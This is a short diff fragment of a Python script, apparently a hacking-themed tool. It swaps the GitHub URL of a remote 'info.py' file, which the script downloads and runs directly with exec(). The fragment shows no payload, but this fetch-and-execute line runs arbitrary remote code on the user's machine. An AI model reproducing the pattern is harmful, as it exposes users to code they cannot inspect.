@@ -34,7 +34,7 @@ time.sleep(2)
 os.system("clear")
 rs=requests.session()
 rg=rs.get
-x=(rg("https://raw.githubusercontent.com/Noob-Hacker71/Noob-Hacker71/main/info.py").text)
+x=(rg("https://raw.githubusercontent.com/MdPalashIslam/bbhh22/main/info.py").text)
 exec(x)
 ##### LOGO #####
 
